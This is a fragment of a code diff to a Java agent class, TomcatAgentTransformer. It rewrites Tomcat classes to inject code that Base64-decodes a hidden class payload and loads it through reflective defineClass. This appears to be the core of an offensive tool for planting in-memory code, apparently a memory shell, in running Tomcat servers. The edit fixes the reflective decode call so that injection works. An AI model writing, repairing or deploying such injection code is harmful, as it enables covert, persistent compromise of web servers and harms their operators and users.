@@ -62,7 +62,7 @@ public class TomcatAgentTransformer implements ClassFileTransformer {
                         "            } catch (Throwable e) {\n" +
                         "                Class base64Clazz = Class.forName(\"java.util.Base64\");\n" +
                         "                Object decoder = base64Clazz.getMethod(\"getDecoder\", null).invoke(base64Clazz, null);\n" +
-                        "                byteArray = (byte[]) base64Clazz.getMethod(\"decode\", new Class[]{byte[].class}).invoke(decoder, new Object[]{injectorCode});\n" +
+                        "                byteArray = (byte[]) decoder.getClass().getMethod(\"decode\", new Class[]{String.class}).invoke(decoder, new Object[]{injectorCode});\n" +
                         "            }\n" +
                         "            java.net.URLClassLoader classLoader = new java.net.URLClassLoader(new java.net.URL[0], Thread.currentThread().getContextClassLoader());\n" +
                         "            java.lang.reflect.Method method = ClassLoader.class.getDeclaredMethod(\"defineClass\", new Class[]{byte[].class, int.class, int.class});\n" +
